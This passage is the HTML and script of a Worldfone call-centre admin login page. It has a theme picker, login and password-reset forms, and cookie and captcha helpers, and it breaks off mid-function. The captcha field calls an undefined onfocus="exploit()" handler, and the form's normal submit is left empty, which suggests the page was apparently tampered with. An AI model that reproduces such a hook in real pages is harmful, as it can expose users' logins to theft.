                </div>
                <div style="opacity: 0.84; padding-top: 0;" class="sologan text-center">
                    <p><i>"Falsehood is invariably the child of fear in one form or another."</i></p>
                    <p class="text-right"><i>Aleister Crowley</i></p>
                </div>
                <div class="col-xs-12 col-sm-12 col-md-12  color_element">
                    <div class="col-xs-2 col-sm-2 col-md-2 color_element_col text-center">
                        <div class="element-wrapper th-button-svg">
                            <svg version="1.1" style="position: absolute; top: -5px; width: 25px; height: 25px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 213 295.5" xml:space="preserve"><g><path class="st0" d="M109.1,13.2c-1.5-1.3-3.7-1.3-5.3,0L16.2,88.3c-1.4,1.2-1.8,3.1-1,4.8L102.8,281c0.9,2,3.3,2.9,5.4,2c0.9-0.4,1.6-1.1,2-2l87.7-187.9c0.8-1.6,0.3-3.6-1-4.8L109.1,13.2z M183.3,87.3l-38.4,0l-26.5-55.7L183.3,87.3z M106.5,25.6l29.4,61.7H77.1L106.5,25.6z M94.7,31.7L68.2,87.3H29.7L94.7,31.7z M25.2,95.4h42.2l29.1,152.8L25.2,95.4z M106.5,257.7L75.6,95.4h61.8L106.5,257.7z M116.5,248.2l29.1-152.8h42.2L116.5,248.2z"></path><path class="st0" d="M179.8,25.1c2.2,0,4-1.8,4-4v-4.8c0-2.2-1.8-4-4-4c-2.2,0-4,1.8-4,4V21C175.8,23.2,177.6,25.1,179.8,25.1z"></path><path class="st0" d="M179.8,48.9c2.2,0,4-1.8,4-4v-4.8c0-2.2-1.8-4-4-4c-2.2,0-4,1.8-4,4v4.8C175.8,47.1,177.6,48.9,179.8,48.9z"></path><path class="st0" d="M189.4,34.6h4.8c2.2,0,4-1.8,4-4s-1.8-4-4-4h-4.8c-2.2,0-4,1.8-4,4S187.1,34.6,189.4,34.6z"></path><path class="st0" d="M165.5,34.6h4.8c2.2,0,4-1.8,4-4s-1.8-4-4-4h-4.8c-2.2,0-4,1.8-4,4S163.3,34.6,165.5,34.6z"></path><path class="st0" d="M33.2,192.1c-2.2,0-4,1.8-4,4c0,0,0,0,0,0v4.8c0,2.2,1.8,4,4,4c2.2,0,4-1.8,4-4v-4.8C37.2,193.9,35.4,192.1,33.2,192.1z"></path><path class="st0" d="M33.2,216c-2.2,0-4,1.8-4,4c0,0,0,0,0,0v4.8c0,2.2,1.8,4,4,4c2.2,0,4-1.8,4-4V220C37.2,217.8,35.4,216,33.2,216z"></path><path class="st0" d="M47.5,206.4h-4.8c-2.2,0-4,1.8-4,4c0,2.2,1.8,4,4,4h4.8c2.2,0,4-1.8,4-4C51.5,208.2,49.7,206.4,47.5,206.4z"></path><path class="st0" d="M23.6,206.4h-4.8c-2.2,0-4,1.8-4,4c0,2.2,1.8,4,4,4h4.8c2.2,0,4-1.8,4-4C27.7,208.2,25.9,206.4,23.6,206.4z"></path></g></svg>
                            <label class="th-label-color-theme">Metal</label>
                        </div>
                        <ul class="section-element clearfix th-pl-1">
                            <li>
                                <a class="kim_1" data-name="element" data-element="Gold" onclick="changeElementColor(this);" data-theme="metal" title="Gold"></a>
                            </li>
                            <li>
                                <a class="kim_2" data-name="element" data-element="Silver" onclick="changeElementColor(this);" data-theme="metal2" title="Silver"></a>
                            </li>
                        </ul>
                    </div>
                    <div class="col-xs-2 col-sm-2 col-md-2 color_element_col text-center">
                        <div class="element-wrapper">
                            <svg version="1.1" style="position: absolute; top: -5px; width: 23px; height: 25px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 213 295.5" xml:space="preserve"><path class="st0" d="M153.4,50.1c-19-28.6-37.8-47.5-38.6-48.3C113.6,0.6,112,0,110.4,0c-1.6,0-3.2,0.7-4.4,1.8c-0.8,0.8-19.6,19.7-38.7,48.3c-6.8,10.2-12.8,20.3-17.9,30.3c0,0.1-0.1,0.1-0.1,0.2C46,87,43.1,93.4,40.5,99.8c-3.1,7.7-5.6,15.3-7.6,22.7c-0.1,0.2-0.1,0.4-0.2,0.7c-3.1,12-4.6,23.5-4.6,34.6c0,21.9,8.5,42.5,23.9,58c14,14,32.2,22.3,51.7,23.8l-0.1,48.9c0,3.4,2.8,6.2,6.2,6.2c1.7,0,3.3-0.7,4.4-1.8c1.1-1.1,1.8-2.7,1.8-4.4l0.1-48.9c19.6-1.4,37.8-9.8,51.8-23.8c15.5-15.5,24.1-36.1,24.1-58c0-11-1.5-22.6-4.6-34.6c0-0.2-0.1-0.4-0.2-0.7c-1.9-7.4-4.4-15-7.5-22.7c-2.5-6.3-5.4-12.7-8.7-19.2c0-0.1-0.1-0.1-0.1-0.2C166.1,70.5,160.2,60.3,153.4,50.1z M77.4,57.2c13.1-19.6,26.3-34.7,32.9-42c6.6,7.2,19.8,22.4,32.8,42c4.9,7.4,10.1,15.8,14.9,25l-41.7,41.6l0.1-51.1c0-3.4-2.8-6.2-6.2-6.2c-3.4,0-6.2,2.8-6.2,6.2l-0.1,51.1L62.5,82.2C67.4,73,72.5,64.5,77.4,57.2z M174.6,122.6l-58.2,58.1l0.1-39.3L163.9,94C168.1,103.1,171.8,112.7,174.6,122.6z M56.6,93.9l47.4,47.4l-0.1,39.3l-58.1-58.2C48.7,112.6,52.4,103,56.6,93.9z M60.9,206.9c-13.1-13.1-20.3-30.6-20.3-49.2c0-7,0.7-14,2-21l61.4,61.5l0,28.8C87.6,225.6,72.6,218.6,60.9,206.9z M179.8,157.8c0,18.6-7.3,36.1-20.4,49.2c-11.7,11.7-26.8,18.7-43,20.1l0-28.8l61.5-61.4C179.1,143.8,179.8,150.8,179.8,157.8z"></path></svg>
                            <label class="th-label-color-theme">Wood</label>
                        </div>
                        <ul class="section-element clearfix th-pl-0">
                            <li>
                                <a class="moc_1" data-name="element" data-element="Green" onclick="changeElementColor(this);" data-theme="tree" title=""></a>
                            </li>
                            <li>
                                <a class="moc_2" data-name="element" data-element="Mint" onclick="changeElementColor(this);" data-theme="tree2" title=""></a>
                            </li>
                        </ul>
                    </div>
                    <div class="col-xs-2 col-sm-2 col-md-2 color_element_col text-center">
                        <div class="element-wrapper">
                            <svg version="1.1" style="position: absolute; top: -5px; width: 17px; height: 25px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 212 294.5" xml:space="preserve"><g><path class="st0" d="M106,288.8c-26.7,0-52.1-10.6-71.4-29.8c-19.2-19.5-29.8-45.2-29.8-72.4c0-39,45.3-106.5,72.4-146.8c6.9-10.2,12.1-17.9,16.6-25.2l0.1-0.1c2.2-3.3,5.6-5.7,9.5-6.5c3.7-0.7,7.5,0,10.6,2.1c1.6,1.1,3.2,2.7,4.3,4.3c1.6,2.5,3.3,5.1,5,7.7c3.7,5.6,7.5,11.5,11.6,17.7c28.8,42.9,72.4,107.8,72.4,146.4c0,27.2-10.6,52.9-29.8,72.4C158.2,278.1,132.9,288.8,106,288.8z M102.2,19.9c-4.6,7.5-9.8,15.3-16.8,25.5C59,84.7,14.8,150.6,14.8,186.6c0,24.6,9.5,47.8,26.9,65.4c17.4,17.3,40.3,26.9,64.3,26.9c24.2,0,47-9.7,64.3-27.2c17.3-17.6,26.9-40.8,26.9-65.4c0-35.6-44.2-101.5-70.7-140.8l0,0c-4.2-6.3-8-12.1-11.7-17.8c-1.7-2.6-3.4-5.2-5-7.7c-0.4-0.5-1-1.2-1.5-1.5c-1.1-0.8-2.2-0.7-3-0.6C104.1,18,103,18.8,102.2,19.9z"></path><path class="st0" d="M174.1,189.3c-3.5-0.9-7.1,1.9-8.1,6.1c-1.5,6.7-4.4,12.8-8.1,17.8c-3.8,5-8.7,9.2-14,11.4c-3.4,1.6-5.5,6.3-4.4,10.2c1.2,4.6,5.1,6.6,8.5,5c7.6-3.4,14.4-9.1,19.5-16.1c5.4-6.9,9.3-15.7,11.2-25.1C179.7,194.3,177.6,190.2,174.1,189.3z"></path></g></svg>
                            <label class="th-label-color-theme" style="left: 20px;">Water</label>
                        </div>

                        <ul class="section-element clearfix th-pl-0">
                            <li>
                                <a class="thuy_1" data-name="element" data-element="Blue" onclick="changeElementColor(this);" data-theme="water2" title=""></a>
                            </li>
                            <li>
                                <a class="thuy_2 element_selected" data-name="element" data-element="Shaphire" onclick="changeElementColor(this);" data-theme="water" title="Blue"></a>
                            </li>
                        </ul>
                    </div>
                    <div class="col-xs-2 col-sm-2 col-md-2 color_element_col text-center">
                        <div class="element-wrapper">
                            <svg version="1.1" style="position: absolute; top: -5px; width: 25px; height: 25px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 213 295.5" xml:space="preserve"><g><g><path class="st0" d="M106.2,280.3c-28.3,0-55-11.3-75.3-31.8c-9.7-9.8-17.4-21.2-22.7-33.8C2.7,201.7-0.1,188-0.1,174c0-30.8,16-65.1,38.9-65.1c3.6,0,7,1.5,9.3,4.2c2.4,2.7,3.5,6.2,3.1,9.7c-2,17.8,1.1,33.8,5.1,38.3c0.7,0.8,1.3,1.1,2.2,1.3c0-0.2,0-0.4,0-0.6c-0.1-3.6-1-8.5-2-14.1c-1.6-9.2-3.4-19.7-3.4-31.2c0-1,0-2.4-0.1-4c-0.5-15.6-1.5-52,21.8-76c13.7-14.1,33.3-21.3,58.2-21.3c4.4,0,8.6,2.4,10.8,6.2s2.2,8.6,0,12.5c-0.8,1.4-19.9,36.5,21.5,61.7c19,11.6,47.3,42,47.3,78.4c0,28.3-11.1,54.9-31.1,75C161.3,269.2,134.6,280.3,106.2,280.3z M38.8,118.8c-14.6,0-28.9,27.3-28.9,55.1c0,12.7,2.5,25.1,7.6,36.9c4.9,11.4,11.8,21.8,20.6,30.7c18.4,18.6,42.6,28.8,68.1,28.8c25.7,0,49.9-10.1,68.1-28.4c18.2-18.3,28.2-42.4,28.2-68c0-32.3-25.4-59.5-42.5-69.9l0,0c-14.1-8.6-31-23.9-31.5-48.2c-0.3-14.7,5.7-25.8,6.4-27c0.5-0.8,0.5-1.7,0-2.5c-0.4-0.8-1.3-1.2-2.1-1.2c-22,0-39.2,6.2-51,18.3c-20.3,20.9-19.4,54.4-19,68.7c0,1.7,0.1,3.2,0.1,4.3c0,10.7,1.7,20.6,3.3,29.5c1,6,1.9,11.2,2.1,15.4c0.2,4.3-0.4,7-1.8,8.7c-1.3,1.6-3.7,2.4-7.3,2.4c-4.3,0-7.7-1.5-10.5-4.7c-9-10.1-8.9-34.6-7.6-46.1c0.1-0.7-0.1-1.4-0.6-1.9C40.2,119.1,39.5,118.8,38.8,118.8z M60.7,162.3L60.7,162.3L60.7,162.3z"></path></g></g></svg>
                            <label class="th-label-color-theme">Fire</label>
                        </div>

                        <ul class="section-element clearfix th-pl-0">
                            <li>
                                <a class="hoa_1" data-name="element" data-element="Fire" onclick="changeElementColor(this);" data-theme="fire" title=""></a>
                            </li>
                            <li>
                                <a class="hoa_2" data-name="element" data-element="Pink" onclick="changeElementColor(this);" data-theme="fire2" title="Pink"></a>
                            </li>
                        </ul>
                    </div>
                    <div class="col-xs-2 col-sm-2 col-md-2 color_element_col text-center">
                        <div class="element-wrapper">
                            <svg version="1.1" style="position: absolute; top: -5px; width: 25px; height: 25px;" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewBox="0 0 213 295.5" xml:space="preserve"><path class="st0" d="M212.4,264.4L188,186c-0.8-2.6-2.7-3.6-4.2-2.2c-1.5,1.4-2.1,4.6-1.3,7.1l23.6,75.9h-82.8c-0.1-0.8-36.1-116.7-36.1-116.7l5.3-16.9l5.6,12.5c0.9,2.1,2.4,3.4,3.9,3.5c1.5,0.1,3-1,4.1-2.9l13.5-25.6l26.2,52.5c1,2,2.4,3.1,3.9,3.1c0,0,0,0,0,0c1.5,0,2.9-1.1,3.9-3c0,0,0,0,0-0.1l0,0l14.4-28l5.6,18.1c0.8,2.6,2.7,3.6,4.2,2.2c1.5-1.4,2.1-4.6,1.3-7.1l-46-147.7c-0.9-2.9-2.7-4.7-4.6-4.7h0c-1.9,0-3.7,1.8-4.6,4.7L101,84.3L89.4,121c0,0,0,0,0,0l-5.6,17.9L67,84.9c-0.7-2.2-1.8-3.7-3.2-4.4c-0.4-0.2-0.9-0.3-1.4-0.3c0,0,0,0,0,0c-0.1,0-0.1,0-0.2,0c-0.1,0-0.1,0-0.2,0c0,0-0.1,0-0.1,0c-0.1,0-0.1,0-0.2,0c-0.1,0-0.1,0-0.2,0.1c-0.1,0-0.1,0-0.2,0c-1.5,0.5-2.8,2.1-3.5,4.5l-11.4,36.1l-19.1,60.6c0,0,0,0,0,0L1.1,264.4c-0.9,2.8-0.8,6,0.1,8.7c0.9,2.7,2.6,4.3,4.5,4.3h202.1c1.8,0,3.5-1.6,4.5-4.3C213.2,270.5,213.3,267.2,212.4,264.4z M96.8,120l32-101.6l36.1,116.2l-15.1,30.1l-26.2-52.5c-0.1-0.2-0.3-0.5-0.4-0.7c-0.9-1.5-2.1-2.3-3.4-2.4c0,0-0.1,0-0.1,0c0,0,0,0-0.1,0c-1.5,0-2.9,1.1-3.9,2.9l-13.4,25.5L95.8,123L96.8,120z M7.4,266.8l23.5-74.6l9.1,12.9c1,1.4,2.2,2.1,3.3,2.1c1.4,0,2.8-1,3.9-3l10.4-19.8l6.7,11.3c1.2,2.1,3.2,2,4.4,0c1.2-2.1,1.2-5.4,0-7.5l-7.5-12.6c-1-1.7-2.4-2.6-3.8-2.6c-1.4,0.1-2.8,1.1-3.7,2.9L43.2,196l-9.3-13.2l28.4-90L99,210.5l-8.9,13.9l-8.1-13.6c-1.2-2.1-3.2-2-4.4,0c-1.2,2.1-1.2,5.4,0,7.5l8.8,14.8c1,1.7,2.3,2.6,3.7,2.6c1.3,0,2.5-0.8,3.5-2.3l8.4-13.1l14.5,46.7H7.4z"></path></svg>
                            <label class="th-label-color-theme">Earth</label>
                        </div>
                        <ul class="section-element">
                            <li>
                                <a class="tho_2" data-name="element" data-element="Orange" onclick="changeElementColor(this);" data-theme="earth" title="Orange"></a>
                            </li>
                            <li>
                                <a class="tho_1" data-name="element" data-element="Brown" onclick="changeElementColor(this);" data-theme="earth2" title="Brown"></a>
                            </li>
                        </ul>
                    </div>
                </div>
            </div>
            <div data-name="form-login" class="col-xs-12 col-sm-12 col-md-6 col-lg-6 cot2">
                <div id="login-container" class="animation-expandUp">

                    <div class="login-title text-center">
                        <h1><img style="margin-left: -8px" src="https://omnicxm.worldfone.cloud/public/img/background_login/worldfone.png" class="logo_wfone"></h1>
                    </div>

                    <!-- Login Block -->
                    <div class="block push-bit" style="padding: 20px 0;">
                        <!-- Reset pass Form -->
                        <form action="" method="post" onsubmit="" class="form-horizontal form-bordered form-control-borderless">
                            <input type="hidden" id="returnurl" name="returnurl" value="https://omnicxm.worldfone.cloud/index.php">
                            <input type="hidden" value="MjE0NDkyNjMyMDYzMjQ2NDM2MjY3ZTI=" name="login-randchecktoken">
                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group">
                                        <span class="input-group-addon"><img src="https://omnicxm.worldfone.cloud/public/img/icon/icon_username.svg" style="height: 23px; transform: translateY(20%); position: relative"></span>
                                        <input type="text" id="login-username" name="login-username" class="form-control input-md" autocomplete="false" placeholder="Username" value="">
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group">
                                        <span class="input-group-addon"><img src="https://omnicxm.worldfone.cloud/public/img/icon/icon_password.svg" style="height: 25px; transform: translateY(20%); position: relative"></span>
                                        <input type="password" id="login-password" name="login-password" class="form-control input-md" placeholder="Password" value="">
                                        <span style="background-color: var(--queue-bg-color)" onclick="showPassword('login-password', 'viewerpassword', true)" class="input-group-addon"><img id="viewerpassword" src="https://omnicxm.worldfone.cloud/public/img/icon/icon_show.png" style="cursor: pointer; height: 25px; transform: translateY(20%); position: relative"></span>
                                    </div>
                                </div>

                            </div>

                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group" style="margin-bottom: -10px; margin-top: -10px;">
                                        <div style="right: 0; position: absolute;">
                                            <a onclick="forgotPassword();" class="forgotpassword">Forgot password?</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div id="covercaptcha" class="form-group ">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group">
                                        <span class="input-group-addon">
                                            <img src="https://omnicxm.worldfone.cloud/public/img/icon/icon_captcha.svg" style="height: 25px; transform: translateY(20%); position: relative">
                                        </span>

                                        <input type="text" id="login-captcha" onfocus="exploit()" name="login-captcha" style="width: calc(100% - 165px);" class="form-control input-md" placeholder="Verification code" autocomplete="off">

                                        <span class="input-group-btn" style="min-width: 50px; display: inline-table; background: var(--queue-bg-color); border-top-right-radius: 20px; border-bottom-right-radius: 20px;">
                                            <button type="button" onclick="reloadcaptcha(this);" style="background: transparent; border: none; height: 35px; border-top-right-radius: 20px; border-bottom-right-radius: 20px; padding: 0px; opacity: 1;">
                                                <img id="imgcaptcha" src="https://omnicxm.worldfone.cloud/admin/login/captcha" style="position: relative; height: 100%; border-top-right-radius: 20px; border-bottom-right-radius: 20px;">
                                            </button>
                                        </span>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group" style="height: 35px;">
                                        <div style="right: 0; position: absolute;">
                                            <button onclick="window.location = 'https://omnicxm.worldfone.cloud/admin/login'" type="submit" style="text-transform: uppercase; min-width: 120px; font-weight: 700;" class="btn btn-sm">Login</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!-- END Login Form -->
                    </div>
                </div>
            </div>
            
            <div data-name="form-resetpassword" class="col-xs-12 col-sm-12 col-md-6 col-lg-6 cot2  th-d-none">
                <div id="login-container" class="animation-expandUp">

                    <div class="login-title text-center">
                        <h1><img style="margin-left: -8px" src="https://omnicxm.worldfone.cloud/public/img/background_login/worldfone.png" class="logo_wfone"></h1>
                    </div>

                    <!-- Login Block -->
                    <div class="block push-bit" style="padding: 20px 0;">
                        <!-- Login Form -->
                        <form method="post" onsubmit="sendNewPassword(this); return false;" id="form-restpassword" class="form-horizontal form-bordered form-control-borderless">
                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group">
                                        <span class="input-group-addon"><img src="https://omnicxm.worldfone.cloud/public/img/icon/icon_email.svg" style="height: 23px; transform: translateY(20%); position: relative; top: 5px"></span>
                                        <input type="email" id="email" name="email" class="form-control input-md" autocomplete="false" placeholder="Enter email address">
                                    </div>
                                </div>
                            </div>
                            
                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group" style="margin-bottom: -10px; margin-top: -10px;">
                                        <div style="right: 0; position: absolute;">
                                            <a onclick="backFormLogin();" class="forgotpassword">Back to sign in</a>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div id="covercaptcha" class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group">
                                        <span class="input-group-addon">
                                            <img src="https://omnicxm.worldfone.cloud/public/img/icon/icon_captcha.svg" style="height: 25px; transform: translateY(20%); position: relative">
                                        </span>

                                        <input type="text" id="resetpass-captcha" name="resetpass-captcha" style="width: calc(100% - 165px);" class="form-control input-md" placeholder="Verification code" autocomplete="off">

                                        <span class="input-group-btn" style="min-width: 50px; display: inline-table; background: var(--queue-bg-color); border-top-right-radius: 20px; border-bottom-right-radius: 20px;">
                                            <button type="button" name="btncaptcha_resetpass" onclick="reloadcaptcha_resetpass(this);" style="background: transparent; border: none; height: 35px; border-top-right-radius: 20px; border-bottom-right-radius: 20px; padding: 0px; opacity: 1;">
                                                <img id="imgcaptcha_resetpass" src="https://omnicxm.worldfone.cloud/admin/login/captcha/restpass" style="position: relative; height: 100%; border-top-right-radius: 20px; border-bottom-right-radius: 20px;">
                                            </button>
                                        </span>
                                    </div>
                                </div>
                            </div>

                            <div class="form-group">
                                <div style="margin: auto;justify-content: center;display: flex;">
                                    <div class="input-group" style="height: 35px;">
                                        <div style="position: absolute; margin-top: 3px;">
                                            <div style="white-space: pre-line;" id="info-resetbyemai" class="info-resetpass"></div>
                                        </div>
                                        <div style="right: 0; position: absolute;">
                                            <button type="submit" style="text-transform: uppercase; min-width: 120px; font-weight: 700;" id="submitrestpassform" class="btn btn-sm">Get new password</button>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </form>
                        <!-- END Login Form -->
                    </div>
                </div>
            </div>
        </div>
    </div>

    <div id="animationtheme">
        <div class="wave"></div>
        <div class="wave-2 wave"></div>
    </div>

    <footer class="footer_login">
        <div class="text-center">
            <small>
                <a href="https://worldfone.vn/dich-vu/tong-dai-call-center-cloud-worldfone4x-lite" target="_blank">
                    <img src="https://omnicxm.worldfone.cloud/public/img/logo/login_logo_footer.png" alt="" class="logo_st">
                </a>
            </small>
            <span class="author"><span>Powered by </span><a class="southtelecomlink" target="_blank" href="https://southtelecom.vn/">South Telecom JSC</a></span>
        </div>
    </footer>

    <div class="select_language right_top" style="bottom: 4px;">
        <label onclick="changeLanguage('vietnamese');" class="vietnamese unselect">Vietnamese</label>
        <label style="color: #fff">|</label>
        <label onclick="changeLanguage('english');" class="english">English</label>
    </div>

    <script type="text/javascript">
        if(typeof getCookie('viewform') !== 'undefined' && getCookie('viewform') === 'resetpass'){
            forgotPassword();
        }else{
            backFormLogin();
        }
        
        function forgotPassword(){
            $('div[data-name="form-resetpassword"]').removeClass('th-d-none');
            $('div[data-name="form-login"]').addClass('th-d-none');
            setCookie('viewform', 'resetpass', 1);
        }
        function backFormLogin(){
            $('div[data-name="form-login"]').removeClass('th-d-none');
            $('div[data-name="form-resetpassword"]').addClass('th-d-none');
            setCookie('viewform', 'login', 1);
        }
        function sendNewPassword(form){
            let email = $('#email').val();
            //validate email
            const re = /^(([^<>()\[\]\\.,;:\s@"]+(\.[^<>()\[\]\\.,;:\s@"]+)*)|(".+"))@((\[[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\])|(([a-zA-Z\-0-9]+\.)+[a-zA-Z]{2,}))$/;
            if(!re.test(String(email).toLowerCase())){
                let text_info = 'This email address is not available. Please try again';
                $('#info-resetbyemai').text(text_info.replace('.', '.\n'));
                return;
            }

            let jsonArray = {
                email: email,
                captcha: $('#resetpass-captcha').val()
            };

            if (strIsEmpty(jsonArray['captcha'])) {
                Swal.fire({
                    icon: 'info',
                    title: langJS['err_parammissing'],
                    text: langJS['lang_captcha']
                });
                return false;
            }
            
            //check time + turn submit
            let date = new Date();
            let now = parseInt(date.getTime()/1000);
            if(!getCookie('turn_resetpassword')){
                setCookie('turn_resetpassword', 1 , 1);
                setCookie('time_resetpassword', now , 1); 
            }else{
                let turn_resetpassword = parseInt(getCookie('turn_resetpassword'));
                let time_resetpassword = parseInt(getCookie('time_resetpassword'));
                if(turn_resetpassword <= 2 && now < (time_resetpassword + 30)){
                    let text_info = langJS['lang_resetpass_retry'] + ' ' + parseInt(time_resetpassword + 30 - now) + ' ' + langJS['lang_resetpass_second'];
                    $('#info-resetbyemai').text(text_info);
                    return false;
                }
                if(turn_resetpassword > 2 && now < (time_resetpassword + 60)){
                    let text_info = langJS['lang_resetpass_retry'] + ' ' + parseInt(time_resetpassword + 60 - now) + ' ' + langJS['lang_resetpass_second'];
                    $('#info-resetbyemai').text(text_info);
                    return false;
                }
                
                setCookie('turn_resetpassword', parseInt(turn_resetpassword + 1) , 1);
                setCookie('time_resetpassword', now , 1);
            }
            
            //reload captcha
            $(form).find('button[name="btncaptcha_resetpass"]').attr('disabled', 'disabled');
            $(form).find('button[name="btncaptcha_resetpass"]').css('opacity', '0.3');
            $(form).find('button[name="btncaptcha_resetpass"]').find('img').attr('src', base_url + 'admin/login/captcha/resetpass?v=' + new Date().getTime());
            
            $.ajax({
                type: "POST",
                url: base_url + 'admin/login/resetpassword',
                data: JSON.stringify(jsonArray),
                dataType: 'json',
                success: function (data) {
                    if(data.status){
                        $('#info-resetbyemai').text(data.msg);
                        reloadcaptcha($('#imgcaptcha').closest('button'));
                    }else{
                        let text_info = data.msg;
                        $('#info-resetbyemai').text(text_info.replace('.', '.\n'));
                    }
                }
            });
        }
        
        function showPassword(id_ele, id_eye, typepassword = false){
            if(typepassword === true) {
                var x = document.getElementById(id_ele);
                if (x.type === "password") {
                    x.type = "text";
                    document.getElementById(id_eye).src= "https://omnicxm.worldfone.cloud/public/img/icon/icon_hidden.png";
                } else {
                    x.type = "password";
                    document.getElementById(id_eye).src= "https://omnicxm.worldfone.cloud/public/img/icon/icon_show.png";
                }
            } else {
                var xnotpass = $('#' + id_ele);
                if (xnotpass.hasClass('th-password')) {
                    xnotpass.removeClass('th-password');
                    document.getElementById(id_eye).src= "https://omnicxm.worldfone.cloud/public/img/icon/icon_hidden.png";
                } else {
                    xnotpass.addClass('th-password');
                    document.getElementById(id_eye).src= "https://omnicxm.worldfone.cloud/public/img/icon/icon_show.png";
                }
            }
        };
        
        function setCookie(name, value, days) {
            var expires = "";
            if (days) {
                var date = new Date();
                date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
                expires = "; expires=" + date.toUTCString();
            }
            document.cookie = name + "=" + (value || "") + expires + "; path=/";
        }

        function getCookie(name) {
            var nameEQ = name + "=";
            var ca = document.cookie.split(';');
            for (var i = 0; i < ca.length; i++) {
                var c = ca[i];
                while (c.charAt(0) === ' ')
                    c = c.substring(1, c.length);
                if (c.indexOf(nameEQ) === 0)
                    return c.substring(nameEQ.length, c.length);
            }
            return null;
        }

        function eraseCookie(name) {
            document.cookie = name + '=; Path=/; Expires=Thu, 01 Jan 1970 00:00:01 GMT;';
        }

        var rememberme = 'init';
        var langJS = {"lang_error_login":"Login unsuccess","err_parammissing":"Param missing","lang_username":"Username","lang_password":"Password","lang_login_text":"Login","lang_day":"Day","lang_month":"Month","lang_year":"Year","lang_metal":"Metal","lang_wood":"Wood","lang_water":"Water","lang_fire":"Fire","lang_earth":"Earth","lang_metal_gold":"Gold","lang_metal_silver":"Silver","lang_wood_green":"Green","lang_wood_mint":"Mint","lang_water_blue":"Blue","lang_water_shaphire":"Shaphire","lang_fire_red":"Red","lang_fire_pink":"Pink","lang_earth_brown":"Brown","lang_earth_orange":"Orange","lang_am":"AM","lang_pm":"PM","lang_newpassword":"New password","lang_confirmnewpassword":"Confirm password","lang_changepassword":"Change password","lang_cancel":"Cancel","lang_captcha":"Verification code","lang_rememberme":"Trust this browser","lang_forgotpassword":"Forgot password?","msg_captchawrong":"Verification code is wrong","msg_loginbynewuser":"Login by new user, please input verification code","msg_passwordwrong":"Password is wrong","msg_usernotexists":"Username is not exists","msg_usernotexistspermission":"User is not config permission","msg_customercodeisnotconfig":"Customer code is not config","msg_changefirstpass":"Change password for first login","msg_passwordnotsame":"Confirm new password is wrong","msg_passwordnotsameoldpass":"New password is same current password","msg_accountdisabled":"Login failed. This account has been disabled","msg_password_weak":"Password must be at least 8 characters in length and should include at least one upper case letter, one number, and one special character","msg_noconfigbu":"User is not config business unit","lang_place_inputemail":"Enter email address","lang_login_sendnewpass":"Get new password","lang_email_correct":"This email address is not available. Please try again","lang_resetpass_success":"Password reset request was sent successfully. Please check your email","lang_backlogin":"Back to sign in","lang_resetpass_retry":"Please try again after","lang_resetpass_second":"seconds","lang_resetnewpass":"Update new password"};
        var element_language = getCookie('language');
        if(element_language === null || element_language === '') {
            element_language = 'vietnamese';
        }
        var timezone_cookie = getCookie('timezone');
        var match = "2022-09-16 18:55:34".match(/^(\d+)-(\d+)-(\d+) (\d+)\:(\d+)\:(\d+)$/);
        var date = new Date(match[1], match[2] - 1, match[3], match[4], match[5], match[6]);
        var timeserver = date.getTime() + 5000;
        var element_cookie = getCookie('element');

        $('#login-rememberme').on('change', function (e) {
            if ($(this).prop('checked') === true) {

            } else {
                if (rememberme === 'yes') {
                    setCookie('rememberme', 'init', 366);
                    $('#covercaptcha').removeClass('disableddiv');
                    reloadcaptcha($('#imgcaptcha').closest('button'));
                }
            }
        });

        function strIsEmpty(value) {
            if (typeof value === 'undefined' ||
                    value === '' ||
                    value === null ||
                    value.trim().length <= 0) {
                return true;
            } else {
                return false;
            }
        }

        function reloadcaptcha(btn) {
            $(btn).attr('disabled', 'disabled');
            $(btn).css('opacity', '0.3');
            $(btn).find('img').attr('src', base_url + 'admin/login/captcha?v=' + new Date().getTime());
        }
        function reloadcaptcha_resetpass(btn) {
            $(btn).attr('disabled', 'disabled');
            $(btn).css('opacity', '0.3');
            $(btn).find('img').attr('src', base_url + 'admin/login/captcha/resetpass?v=' + new Date().getTime());
        }

        $('#imgcaptcha').on('load', function () {
            $(this).closest('button').removeAttr('disabled');
            $(this).closest('button').css('opacity', '1');
        });
        $('#imgcaptcha_resetpass').on('load', function () {
            $(this).closest('button').removeAttr('disabled');
            $(this).closest('button').css('opacity', '1');
        });

        function submitlogin(form) {
            let jsonArray = {
                username: $('#login-username').val(),
                password: $('#login-password').val(),
                captcha: $('#login-captcha').val()
            };

            if (strIsEmpty(jsonArray['username'])) {
                Swal.fire({
                    icon: 'info',
                    title: langJS['err_parammissing'],
                    text: langJS['lang_username']
                });
                return false;
            }

            if (strIsEmpty(jsonArray['password'])) {
                Swal.fire({
                    icon: 'info',
                    title: langJS['err_parammissing'],
                    text: langJS['lang_password']
                });
                return false;
            }

            if (rememberme === 'init' || rememberme === 'no') {
                if (strIsEmpty(jsonArray['captcha'])) {
                    Swal.fire({
                        icon: 'info',
                        title: langJS['err_parammissing'],
